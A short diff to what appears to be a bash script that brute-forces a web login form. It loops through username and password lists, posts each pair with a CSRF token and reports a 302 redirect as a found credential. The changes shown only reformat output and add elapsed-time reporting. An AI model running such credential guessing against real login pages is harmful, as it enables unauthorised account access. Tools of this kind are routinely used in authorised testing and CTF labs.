@@ -17,7 +17,7 @@ test-credentials() {
       --data-raw "username=${username}&csrf_token=${CSRF_TOKEN}&password=${password}")
 
     if [ "${HTTP_CODE}" -eq 302 ]; then
-        echo "[+] RESULT: ${username}:${password} on ${host}\n"
+        echo "${username}:${password}"
     fi
 }
 
@@ -29,16 +29,17 @@ fi
 
 
 HOST="$1"
+SECONDS=0
 
 while IFS= read -r USERNAME || [[ -n "$USERNAME" ]]; do
     while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do
         printf "testing ${USERNAME}:${PASSWORD} on ${HOST}\n"
         RESULT=$(test-credentials "${USERNAME}" "${PASSWORD}" "${HOST}")
         if [[ -n "$RESULT" ]]; then
-            printf "${RESULT}"
+            printf "+ RESULT: ${RESULT} on ${HOST} found in ${SECONDS}s\n"
             exit 0
         fi
     done < passwords.txt
 done < usernames.txt
-printf "RESULT: No match was found\n"
+printf "+ \"RESULT: No match was found\nSearched for ${SECONDS}s\"\n"
 exit 0
